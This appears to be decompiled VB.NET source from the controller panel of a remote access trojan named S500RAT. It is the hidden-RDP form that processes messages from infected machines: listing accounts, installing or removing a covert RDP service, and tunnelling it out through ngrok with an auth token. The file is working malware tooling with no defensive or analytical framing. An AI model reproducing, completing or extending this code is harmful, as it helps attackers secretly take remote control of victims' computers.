Imports System
Imports System.Drawing
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004D RID: 77
	Public Class FrmHRDP
		' Token: 0x0600118F RID: 4495 RVA: 0x00099128 File Offset: 0x00097328
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formHRDP As FormHRDP = CType(Application.OpenForms("FormHRDP" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHRDP)
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				Dim num As UInteger = <PrivateImplementationDetails>.ComputeStringHash(asString)
				If num <= 2082903604UI Then
					If num <= 702470087UI Then
						If num <> 548177275UI Then
							If num = 702470087UI Then
								If Operators.CompareString(asString, "ListUsers", False) = 0 Then
									Dim flag As Boolean = formHRDP IsNot Nothing
									If flag Then
										formHRDP.ListHRDP.Rows.Clear()
										Dim asString2 As String = unpack_msgpack.ForcePathObject("Acount").AsString
										Dim array As String() = asString2.Split(New String() { "-==>" }, StringSplitOptions.None)
										Dim num2 As Integer = array.Length - 1
										For i As Integer = 0 To num2
											Dim flag2 As Boolean = array(i).Length > 0
											If flag2 Then
												formHRDP.ListHRDP.Rows.Add(New Object() { array(i), array(i + 1) })
											End If
											i += 1
										Next
										Dim flag3 As Boolean = Not formHRDP.RemoveRDP.Enabled
										If flag3 Then
											formHRDP.RemoveRDP.Enabled = True
										End If
										Dim flag4 As Boolean = Not formHRDP.CreateRDP.Enabled
										If flag4 Then
											formHRDP.CreateRDP.Enabled = True
											formHRDP.CreateRDP.Text = "Create"
										End If
									End If
								End If
							End If
						ElseIf Operators.CompareString(asString, "ConnectNagrok", False) = 0 Then
							Dim flag5 As Boolean = formHRDP IsNot Nothing
							If flag5 Then
								Dim flag6 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Value").AsString)
								If flag6 Then
									formHRDP.ConnectNgrok.FillColor = Color.FromArgb(192, 64, 0)
									formHRDP.ConnectNgrok.FillColor2 = Color.FromArgb(255, 128, 0)
									formHRDP.ConnectNgrok.Text = "Disconnect"
								Else
									formHRDP.ConnectNgrok.FillColor = Color.FromArgb(24, 83, 219)
									formHRDP.ConnectNgrok.FillColor2 = Color.FromArgb(63, 119, 232)
									formHRDP.ConnectNgrok.Text = "Connect"
								End If
								formHRDP.ConnectNgrok.Enabled = True
							End If
						End If
					ElseIf num <> 976575442UI Then
						If num = 2082903604UI Then
							If Operators.CompareString(asString, "setClient", False) = 0 Then
								Dim flag7 As Boolean = formHRDP IsNot Nothing
								If flag7 Then
									Dim flag8 As Boolean = formHRDP.Client Is Nothing
									If flag8 Then
										formHRDP.Client = client
										formHRDP.Timer1.Enabled = True
										Dim flag9 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Admin").AsString)
										If flag9 Then
											formHRDP.GroupBox1.Enabled = True
											formHRDP.GroupBox2.Enabled = True
											formHRDP.StateHRDP.Text = "HRDP Ready"
										Else
											formHRDP.StateHRDP.Text = "NB! Requires running the client as an administrator"
											formHRDP.StateHRDP.ForeColor = Color.Red
										End If
										Dim flag10 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("ChackRDP").AsString)
										If flag10 Then
											formHRDP.InstallAndUnstalRDP.FillColor = Color.FromArgb(192, 64, 0)
											formHRDP.InstallAndUnstalRDP.FillColor2 = Color.FromArgb(255, 128, 0)
											formHRDP.InstallAndUnstalRDP.Text = "UnInstall"
										Else
											formHRDP.InstallAndUnstalRDP.FillColor = Color.FromArgb(26, 155, 161)
											formHRDP.InstallAndUnstalRDP.FillColor2 = Color.FromArgb(26, 155, 110)
											formHRDP.InstallAndUnstalRDP.Text = "Install"
										End If
										Dim flag11 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("ngrok").AsString)
										If flag11 Then
											formHRDP.ConnectNgrok.FillColor = Color.FromArgb(192, 64, 0)
											formHRDP.ConnectNgrok.FillColor2 = Color.FromArgb(255, 128, 0)
											formHRDP.ConnectNgrok.Text = "Disconnect"
										Else
											formHRDP.ConnectNgrok.FillColor = Color.FromArgb(24, 83, 219)
											formHRDP.ConnectNgrok.FillColor2 = Color.FromArgb(63, 119, 232)
											formHRDP.ConnectNgrok.Text = "Connect"
										End If
									End If
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "Token", False) = 0 Then
						Dim flag12 As Boolean = MyProject.Forms.m_FormAdmin IsNot Nothing
						If flag12 Then
							formHRDP.YourAuthtoken.Text = unpack_msgpack.ForcePathObject("Value").AsString
						End If
					End If
				ElseIf num <= 2976073396UI Then
					If num <> 2860428573UI Then
						If num = 2976073396UI Then
							If Operators.CompareString(asString, "StateNagrok", False) = 0 Then
								Dim flag13 As Boolean = formHRDP IsNot Nothing
								If flag13 Then
									Dim asString3 As String = unpack_msgpack.ForcePathObject("State").AsString
									Dim flag14 As Boolean = asString3.Contains("Error")
									If flag14 Then
										formHRDP.StateNagrok.ForeColor = Color.Red
									Else
										formHRDP.StateNagrok.ForeColor = Color.White
									End If
									formHRDP.StateNagrok.Text = asString3
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "HostNagrok", False) = 0 Then
						Dim flag15 As Boolean = formHRDP IsNot Nothing
						If flag15 Then
							Dim asString4 As String = unpack_msgpack.ForcePathObject("Value").AsString
							formHRDP.HostNgrok.Text = asString4
						End If
					End If
				ElseIf num <> 3295803506UI Then
					If num <> 3807625537UI Then
						If num = 4086144241UI Then
							If Operators.CompareString(asString, "Error", False) = 0 Then
								Dim flag16 As Boolean = MyProject.Forms.m_FormAdmin IsNot Nothing
								If flag16 Then
									MyProject.Forms.FormAdmin.StateAdmin.ForeColor = Color.Red
									MyProject.Forms.FormAdmin.StateAdmin.Text = unpack_msgpack.ForcePathObject("Error").AsString
								End If
							End If
						End If
					ElseIf Operators.CompareString(asString, "StateInstallRDP", False) = 0 Then
						Dim flag17 As Boolean = formHRDP IsNot Nothing
						If flag17 Then
							Dim asString5 As String = unpack_msgpack.ForcePathObject("State").AsString
							Dim flag18 As Boolean = asString5.Contains("Error")
							If flag18 Then
								formHRDP.StateInstalRDP.ForeColor = Color.Red
							Else
								formHRDP.StateInstalRDP.ForeColor = Color.White
							End If
							formHRDP.StateInstalRDP.Text = asString5
						End If
					End If
				ElseIf Operators.CompareString(asString, "InstallRDP", False) = 0 Then
					Dim flag19 As Boolean = formHRDP IsNot Nothing
					If flag19 Then
						Dim flag20 As Boolean = Conversions.ToBoolean(unpack_msgpack.ForcePathObject("Value").AsString)
						If flag20 Then
							formHRDP.InstallAndUnstalRDP.FillColor = Color.FromArgb(192, 64, 0)
							formHRDP.InstallAndUnstalRDP.FillColor2 = Color.FromArgb(255, 128, 0)
							formHRDP.InstallAndUnstalRDP.Text = "Uninstall"
							formHRDP.InstallAndUnstalRDP.Enabled = True
						Else
							formHRDP.InstallAndUnstalRDP.FillColor = Color.FromArgb(26, 155, 161)
							formHRDP.InstallAndUnstalRDP.FillColor2 = Color.FromArgb(26, 155, 110)
							formHRDP.InstallAndUnstalRDP.Text = "Install"
							formHRDP.InstallAndUnstalRDP.Enabled = True
						End If
					End If
				End If
			Catch ex As Exception
				ListLogs.AddArray("HRDP " + client.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
